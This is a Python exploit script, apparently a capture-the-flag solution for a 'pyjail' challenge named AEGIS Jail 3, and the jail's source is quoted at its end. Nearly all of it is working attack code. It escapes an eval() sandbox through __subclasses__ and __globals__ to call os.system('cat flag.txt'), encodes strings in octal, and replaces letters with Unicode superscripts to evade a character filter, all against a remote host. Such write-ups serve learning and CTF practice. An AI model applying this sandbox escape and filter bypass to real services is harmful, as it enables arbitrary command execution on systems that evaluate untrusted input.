from pwn import *
# context.log_level = "debug"
r = remote("35.229.167.82","8000")

# payload = """''.__class__.__mro__[-1].__subclasses__()[137].__init__.__globals__"""
def str_to_char(string):
    pay = ""
    for c in string:
        pay += f"chr({ord(c)})+"
    return pay[:-1]
def str_to_octal(string):
    pay = ""
    for c in string:
        pay += f'\\{oct(ord(c))[2:]}'
    return pay
payload = f"""''.__class__.__mro__[-1].__subclasses__()[137].__init__.__globals__.__getitem__("{str_to_octal("system")}")("{str_to_octal('cat flag.txt')}")"""
# payload = f"""''.__class__.__mro__[-1].__subclasses__()[137].__init__.__globals__.__getitem__("system")"""
# payload = '''reload(__builtins__)''' 

# for j in range(200):
#     payload = f"""''.__class__.__mro__[-1].__subclasses__()[{j}]"""
#     new_char = "ᵃᵇᶜᵈᵉᶠᵍʰᵢʲᵏˡᵐⁿᵒᵖ𝐪ʳˢᵗᵘᵛʷˣʸᶻᴬᴮCᴰᴱFᴳᴴᴵᴶᴷᴸᴹᴺᴼᴾＱᴿ𝖲ᵀᵁⱽᵂⅩ𝖸Z"
#     new_payload = ""
#     for i in range(len(payload)):
#         index = ord(payload[i]) - ord('a')
#         if index >= 0 and index < len(new_char):
#             new_payload += new_char[index]
#         else:
#             new_payload += payload[i]
#     print(new_payload)
#     r.sendlineafter(b'AEGIS> ',new_payload)
#     print(j,r.recvline())
new_char = "ᵃᵇᶜᵈᵉᶠᵍʰᵢʲᵏˡᵐⁿᵒᵖ𝐪ʳˢᵗᵘᵛʷˣʸᶻᴬᴮCᴰᴱFᴳᴴᴵᴶᴷᴸᴹᴺᴼᴾＱᴿ𝖲ᵀᵁⱽᵂⅩ𝖸Z"
new_payload = ""
for i in range(len(payload)):
    index = ord(payload[i]) - ord('a')
    if index >= 0 and index < len(new_char):
        new_payload += new_char[index]
    else:
        new_payload += payload[i]
print(new_payload)
r.sendlineafter(b'AEGIS> ',new_payload)
print(r.recvline())
r.interactive()
# [ᵢ ᶠᵒʳ ᵢ ᵢⁿ ''.__ᶜˡᵃˢˢ__.__ᵐʳᵒ__[-1].__ˢᵘᵇᶜˡᵃˢˢᵉˢ__() ᵢᶠ ᵢ.__ⁿᵃᵐᵉ__ == "_ʷʳᵃᵖ_ᶜˡᵒˢᵉ"][0].__ᵢⁿᵢᵗ__.__ᵍˡᵒᵇᵃˡˢ__['ˢʸˢᵗᵉᵐ']('ˡˢ')
'''
#!/usr/local/bin/python

logo="""
░█████╗░███████╗░██████╗░██╗░██████╗ Jail 3
██╔══██╗██╔════╝██╔════╝░██║██╔════╝
███████║█████╗░░██║░░██╗░██║╚█████╗░
██╔══██║██╔══╝░░██║░░╚██╗██║░╚═══██╗
██║░░██║███████╗╚██████╔╝██║██████╔╝
╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝╚═════╝░ Type "hint" to see source! """
print(logo)

while True:
    ip = input("AEGIS> ")
    if 'hint' in ip:
        print(__import__('os').system('cat jail.py'))
        exit()
    try:
        if any (i in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' for i in ip):
            print("I don't like any \"LETTER\"!")
            continue
        print(eval(ip, {"__builtins__": {}}, {"__builtins__": {}}))
    except Exception as error:
        print("ERROR:", error)
        print("Good luck next time!")
        pass
'''